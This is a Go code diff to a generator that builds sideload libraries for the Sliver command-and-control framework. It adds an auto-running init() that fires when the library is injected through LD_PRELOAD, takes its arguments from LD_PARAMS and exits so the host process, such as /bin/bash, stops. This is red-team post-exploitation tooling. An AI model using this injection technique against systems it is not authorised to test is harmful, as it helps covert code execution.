@@ -1271,8 +1271,7 @@ func (pc *polyConfig) generateMainGo(cfg HostConfig) string {
 	b.WriteString("}\n\n")
 
 	if cfg.Sideload {
-		// Sliver Sideload entrypoint. Windows: implant passes args as a C string.
-		// Linux: when cargs is nil, fall back to LD_PARAMS (Sliver convention).
+		// Windows Sideload: implant dlopen + calls exported Run(char*).
 		b.WriteString("//export Run\n")
 		b.WriteString("func Run(cargs *C.char) {\n")
 		b.WriteString("\targs := []string{\"app\"}\n")
@@ -1284,6 +1283,20 @@ func (pc *polyConfig) generateMainGo(cfg HostConfig) string {
 		b.WriteString("\t\targs = append(args, strings.Fields(v)...)\n")
 		b.WriteString("\t}\n")
 		b.WriteString("\trunWithArgs(args)\n")
+		b.WriteString("}\n\n")
+		// Linux/Darwin Sideload: implant uses LD_PRELOAD + LD_PARAMS and does
+		// NOT call EntryPoint. Auto-run from init when preloaded, then exit so
+		// the host process (e.g. /bin/bash) does not continue into Result.
+		b.WriteString("func init() {\n")
+		b.WriteString("\tif os.Getenv(\"LD_PRELOAD\") == \"\" {\n")
+		b.WriteString("\t\treturn\n")
+		b.WriteString("\t}\n")
+		b.WriteString("\targs := []string{\"app\"}\n")
+		b.WriteString("\tif v := os.Getenv(\"LD_PARAMS\"); v != \"\" {\n")
+		b.WriteString("\t\targs = append(args, strings.Fields(v)...)\n")
+		b.WriteString("\t}\n")
+		b.WriteString("\trunWithArgs(args)\n")
+		b.WriteString("\tos.Exit(0)\n")
 		b.WriteString("}\n\n")
 		b.WriteString("func main() {}\n\n")
 	}
